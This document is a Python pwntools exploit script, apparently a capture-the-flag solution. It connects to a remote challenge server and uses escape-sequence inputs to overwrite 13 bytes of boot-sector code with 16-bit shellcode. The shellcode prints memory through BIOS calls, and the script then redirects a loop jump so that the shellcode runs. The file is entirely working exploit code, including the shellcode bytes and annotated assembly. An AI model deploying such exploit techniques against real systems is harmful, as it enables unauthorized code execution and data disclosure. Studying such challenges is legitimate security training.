from pwn import *
context.log_level='debug'

if args.REMOTE:
  p = remote("13.201.224.182", 30157)
else:
  p = remote('127.0.0.1', 10000)

p.recvuntil('Disk...\r\n', drop=True)

orig   = b'\xfa\x31\xc0\x8e\xd8\x8e\xc0\x8e\xd0\xbc\xff\xff\xfb'
shellc = b'\xbe\xC6\x7D\xAC\xB4\x0E\xBB\x07\x00\xCD\x10\xEB\xF6'

# modify 13 bytes of code at 0x7c09, replace it by our shellcode
'''
[bits 16]
push cs
pop ds
mov si, 0x7dc6
loop0:
  lodsb
  mov ah,0xe
  mov bx,7
  int 0x10
  jmp loop0
end:
'''

offset = 0x35	# 0x7fc04 + (0x36 - 0x30) = 0x7fc09
for i in range(13):
  o = orig[i]
  n = shellc[i]
  if (n > o):
    for j in range(n-o):
      p.send( p8(offset)+b'\x1b[A')
      sleep(0.1)
  else:
    for j in range(o-n):
      p.send(p8(offset)+b'\x1b[B')
      sleep(0.1)
  offset += 1

# change 0x7c31 offset of jmp 0x7c30 endless loop to jump to 0x7c09
offset = 0x5d
for j in range(0xfe-0xd7):
      p.send(p8(offset)+b'\x1b[B')
      sleep(0.1)

# terminate input & jump to our shellcode
p.send(b'\x1b')

print(p.recv(128))


